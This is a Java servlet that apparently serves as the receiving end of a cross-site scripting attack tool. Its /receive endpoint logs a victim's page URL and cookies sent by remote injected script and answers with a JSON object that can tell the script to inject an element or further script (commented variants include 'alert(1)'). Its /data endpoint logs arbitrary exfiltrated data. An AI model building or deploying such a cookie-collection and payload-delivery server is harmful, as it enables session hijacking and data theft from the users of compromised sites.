package com.ss.servlet;

import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.log4j.Logger;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.ss.bean.InjectBean;

/**
 * get cookies and url data from remote, and save to log
 * 
 * get data from POST
 * 
 * request: url=url&cookie=cookie
 * 
 * response {'name':'element/script/null', 'content':'?/?/?'};
 */
@WebServlet(name = "GetDataServlet", urlPatterns={"/receive", "/data"})
public class GetDataServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;
    
	private static Logger logger = Logger.getLogger(GetDataServlet.class);
	
	protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		
		if("/receive".equals(request.getServletPath())){
			String url = request.getParameter("url");
			String cookie = request.getParameter("cookie");
			logger.info(url);
			logger.info(cookie);
			
//		InjectBean bean = new InjectBean("element", "onlne test");
//		InjectBean bean = new InjectBean("script", "alert(1)");
			InjectBean bean = new InjectBean();
			
			response.setCharacterEncoding("UTF-8");
			response.setContentType("application/json; charset=utf-8");
			PrintWriter out = null;
			ObjectMapper mapper = new ObjectMapper();
			try {
				out = response.getWriter();
				String jsonStr = mapper.writeValueAsString(bean);
				logger.info(jsonStr);
				out.write(jsonStr);
			} catch (IOException e) {
				e.printStackTrace();
			} finally {
				if (out != null) {
					out.close();
				}
			}
			
		}else if("/data".equals(request.getServletPath())){
			String url = request.getParameter("url");
			String data = request.getParameter("data");
			logger.info(url);
			logger.info(data);
		}
	}

}
